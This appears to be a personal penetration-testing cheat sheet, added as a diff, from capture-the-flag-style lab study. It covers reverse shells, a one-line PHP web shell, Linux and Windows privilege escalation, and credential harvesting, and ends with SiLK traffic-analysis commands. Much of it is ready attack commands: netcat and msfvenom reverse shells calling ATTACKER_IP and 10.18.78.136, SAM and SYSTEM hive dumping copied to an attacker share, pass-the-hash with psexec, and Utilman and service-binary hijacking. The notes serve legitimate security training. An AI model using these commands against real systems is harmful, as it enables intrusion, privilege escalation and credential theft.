@@ -1,0 +1,427 @@
+:: Shells
+
+=========
+| Tools |
+=========
+
+: Netcat
+
+: Socat -> Like Netcat but can do more. However, its not always installed
+
+: Metasploit - multi/handler
+
+: Msfvenom
+
+: Payloads all the Things
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+: Pentest Monkey Reverse Shell Cheatsheet
+https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+: Linux pre-installed
+/usr/share/webshells
+
+<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+
+: SecList repo for shells
+https://github.com/danielmiessler/SecLists
+
+=========
+| Types |
+=========
+
+: Reverse Shell
+-> The target is forced to execute code that connects back to your machine.
+-> Listening on our own machine, sending a connection from the target.
+
+: Bind Shell
+-> A shell attached to a shell is started on the target. We now connect to the machine to execute code.
+-> Listening on the target, connecting to it from our own machine.
+
+: Interactive
+-> Allows you to interact with a programm such as ssh.
+
+: Non-interactive
+-> Doesn't allow interaction with a program. Hence ssh won't work and the shell needs to stabalized
+
+
+:: Linux Privelege Escalation
+
+===============
+| Enumeration |
+===============
+
+hostname
+-> Get hostname of the machine
+
+uname -a
+-> Prints system information
+
+ps
+-> See the running processes.
+
+env
+-> Shows environmental variables
+
+sudo -l
+-> Shows all command the current account may use with sudo
+
+ls -la
+-> Can be used to find hidden files.
+
+id
+-> Look at user info
+
+history
+-> Look at the terminal history
+
+ifconfig
+-> Gives network information
+
+ip route
+-> Shows the network hops the machine can make
+
+Netstat
+-> Looks at existing communication
+-> -ano is often used
+
+-a	-> Shows all listening ports and established connections
+-at/au	-> List TCP or UDP protocols respectively
+-l	-> List ports in listening mode. lt/lu for TCP/UDP only
+-s	-> List network usage statisctics by protocol. st/su for TCP/UDP only
+-tp	-> List connections with the service name and PID information.
+-i	-> Shows interface statistics.
+-n	-> Do not resolve names
+-o	-> Display timers
+
+find
+-> Search the target for a specific file/folder.
+
+find . -name flag1.txt
+-> find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt
+-> find the file names “flag1.txt” in the /home directory
+find / -type d -name config
+-> find the directory named config under “/”
+find / -type f -perm 0777
+-> find files with the 777 permissions (files readable, writable, and executable by all users)
+find / -perm a=x
+-> find executable files
+find /home -user frank
+-> find all files for user “frank” under “/home”
+find / -mtime 10
+-> find files that were modified in the last 10 days
+find / -atime 10
+-> find files that were accessed in the last 10 day
+find / -cmin -60
+-> find files changed within the last hour (60 minutes)
+find / -amin -60
+-> find files accesses within the last hour (60 minutes)
+find / -size 50M
+-> find files with a 50 MB size
+find / -perm -u=s -type f 2>/dev/null
+-> Find files with the SUID bit.
+
+
+:: Usefull files
+
+/proc/version
+-> This file is found on many Linux systems and give info about system processes.
+
+/etc/issue
+-> Information about the system
+
+/etc/passwd
+-> Contains user and password information.
+cat /etc/passwd | cut -d ":" -f 1
+-> Display only usernames
+cat /etc/passwd | grep home
+-> Show users in the home folder
+
+========================
+| Privilege Escalation |
+========================
+
+----------
+:: Linux |
+----------
+
+: Capabilities
+
+getcap -r / 2>/dev/null
+-> This shows all binaries with their capabilities set and supressing any errors.
+
+: Cronjobs
+
+cat /etc/crontab
+-> View all existing cronjobs
+
+: Kernel Exploit
+
+uname -a 
+-> Find the current kernel version and look for an exploit. 
+-> Follow the instructions
+
+: PATH variable
+
+find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
+-> Find writable folder
+echo $PATH
+-> View PATH variable
+export PATH=/<folder>:$PATH
+-> Add folder to PATH variable (in front of)
+
+: NFS 
+
+showmount -e <IP>
+-> Show shares of a remote system
+cat /etc/exports
+-> Show shares from the system itself
+
+: Sudo
+
+sudo -l
+-> Find out which programs may be run with sudo
+-> Use GTFOBins to look for ways to exploit these programs
+
+: Suid
+
+find / -type f -perm -4000 2>/dev/null
+find / -type f -perm -4000 -ls 2>/dev/null
+
+: Crack shadow/passwd files
+
+unshadow passwd.txt shadow.txt
+-> Output to console
+unshadow passwd.txt shadow.txt > passwords.txt
+-> Output to file
+
+john <hashes> --wordlist=/usr/share/wordlists/rockyou.txt 
+
+------------
+:: Windows |
+------------
+
+: Password harvesting
+
+-> Unattended Windows Installations
+
+    C:\Unattend.xml
+    C:\Windows\Panther\Unattend.xml
+    C:\Windows\Panther\Unattend\Unattend.xml
+    C:\Windows\system32\sysprep.inf
+    C:\Windows\system32\sysprep\sysprep.xml
+
+-> Powershell History
+
+-> via cmd.exe
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+-> via powershell.exe
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+
+-> Saved Windows Credentials
+
+-> List saved credentials
+cmdkey /list
+-> Use found credentials
+runas /savecred /user:admin cmd.exe
+
+-> IIS Configuration
+
+    C:\inetpub\wwwroot\web.config
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+-> Find database connection stringstype C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+
+
+-> Retrieve Credentials from Software: PuTTY
+
+-> Stored proxy credentials
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+
+
+: Quick wins
+
+-> Scheduled Tasks
+
+schtasks
+-> View all scheduled tasks
+schtasks /query /tn <name>
+-> View only the task with the specified taskname (tn)
+schtasks /query /tn <name> /fo list /v
+-> View only the task with the specified taskname with full and more verbose information list
+icalcs <file path>
+-> Check permissions for the found "task to run" executable
+C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
+-> Modifiy the bat file with our reverse shell script
+schtasks /run /tn vulntask
+-> Run the specified task
+
+-> AlwaysInstalledElevated (msi), can be configured to run with higher privileges from any user account 
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+-> Both key need to be set for this to work
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.96.0 LPORT=LOCAL_PORT -f msi -o malicious.msi
+-> Create malicious msi file with msi venom and start the msf console
+msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+-> Execute the msi on the target system
+
+: Service Misconfigurations
+
+-> Insecure Permissions on Service Executable
+
+sc qc WindowsScheduler
+-> Query the service configuration for WindowsScheduler service
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+-> Check permissions for the BINARY_PATH_NAME
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+-> Create payload and send to system with http server
+-> Create backup of the original file and move the malicious file in place
+icacls WService.exe /grant Everyone:F
+-> Grant full permission to the Everyone group
+sc stop/start <service name>
+-> Stop and start the modified service to receive a reverse shell
+
+: Dangerous Privileges
+
+whoami /priv
+-> Check your windows accounts privileges
+-> https://github.com/gtworek/Priv2Admin
+-> Comprehensive list of exploitable privileges
+
+-> List of usable privileges if set
+
+SeBackup / SeRestore
+
+-> Read and write to and from any file on the system
+reg save hklm\system C:\<folder>\system.hive
+reg save hklm\sam C:\<folder>\sam.hive
+-> Backup the SYSTEM and SAM registry hives.
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+-> Create new folder to share through SMB to copy over the hives. Credentials used are those of the target machine.
+copy C:\<folder>\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\<folder>\system.hive \\ATTACKER_IP\public\
+-> Transfer the hives to the attacker machine.
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+-> Use Impacket to extract the administrators password hash.
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<ip>
+-> Pass the hash attack with PSexec using the admin hash
+
+SeTakeOwnership
+
+-> Take ownership of any object on the system, including files and registry keys.
+takeown /f C:\Windows\System32\Utilman.exe
+-> Take ownership of utilman executable
+icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
+-> Give our account full privileges over the executable
+copy cmd.exe utilman.exe
+-> Replace the executabel with a copy of cmd.exe
+-> Lock the screen and start ease of access to start utilman (cmd)
+
+SeImpersonate / SeAssignPrimaryToken
+
+-> Impersonate other users and act on their behalf
+-> Next example we have a webshell with a user that has these privileges
+nc -nlvp 1337
+-> Start listener on the attack machine.
+RogueWinRM.exe -p "C:\Tools\nc64.exe" -a "-e cmd.exe 10.18.78.136 1337"
+-> Start RogueWinRM an the target machine, which starts netcat with arguments a
+
+Programs to add to commands file:
+
+Impacket-smbserver
+Impacket-psexec
+Impacket-secretsdump
+
+-> Unquoted Service Paths
+
+sc qc "disk sorter enterprise"
+-> Searching for services with spaces might mean we can create a missing exe (disk.exe) as it will look for that first. 
+icacls <binary path>
+-> Check the instalation folder for permissions
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe
+-> Create payload, transfer, setup listener
+sc stop/start "disk sorter enterprise"
+-> Stop then start the service
+
+-> Insecure Service Permissions
+
+accesschk64.exe -qlc thmservice
+-> Use Sysinternals accesschk to check the service DACL config permissions
+-> SERVICE_ALL_ACCESS for BUILTIN\Users mean we can change the configuration of the service
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+-> Change the service binary
+msfvenom -p windows/x64/shell_reverse_tcp lhost=10.18.78.136 lport=1337 -f exe-service -o rev-svc2.exe
+-> Create payload, transfer, setup listener
+sc start/stop "thmservice"
+-> Stop then start the service
+
+: Vulnerable Software
+
+wmic product get name,version,vendor
+-> Displays most installed programs. Check for vulnerabilities.
+
+: Other tools to use
+
+WinPEAS
+
+PrivescCheck
+
+WES-NG: Windows Exploit Suggester - Next Generation
+
+Metasploit
+
+
+
+::SiLK
+
+: Basic commands
+
+silk_config -v
+-> Command to verify and view the installation details
+rwfileinfo FILENAME
+-> Overviewing the file info
+rwcut FILENAME
+-> Open and print all the records without any filter or parameter
+
+: Advanced commands
+
+rwcut FILENAME --num-recs=5
+-> View first 5 records
+rwcut FILENAME --tail-rec=5
+-> View last 5 records
+rwcut FILENAME --fields=protocol,sIP,sPort,dIP,dPort --num-recs=5
+-> Show only the specified columns
+Columns
+    Source IP: sIP
+    Destination IP: dIP
+    Source port: sPort
+    Destination port: dPort
+    Duration: duration
+    Start time: sTime
+    End time: eTime
+	
+rwfiltering FILENAME <Filter parameters> --pass=stdout | rwcut
+-> Filter the data based on the supplied parameters and passes the output to rwcut for viewing.
+-> --pass=stdout | must be used for using with rqcut 
+Filtering
+    Protocols: --proto
+        Possible values are 0-255.
+    Port filters:
+        Any port: --aport
+        Source port: --sport
+        Destination port: --dport
+        Possbile values are 0-65535.
+    IP filters: Any IP address: --any-address
+        Source address: --saddress 
+        Destination address: --daddress
+    Volume filters: Number of the packets --packets number of the bytes --bytes
+	
+rwstats FILENAME --fields=<field>
+-> Provide some statistics on traffic records based on certain fields
+rwstats FILENAME --fields=dPort --values=records,packets,bytes,sIP-Distinct,dIP-Distinct --count=10
+-> --count: Limits the number of records printed on the console
+-> --values=records,packets,bytes: Shows the measurement in flows, packets, and bytes
+-> --values=sIP-Distinct,dIP-Distinct: Shows the number of unique IP addresses that used the filtered field
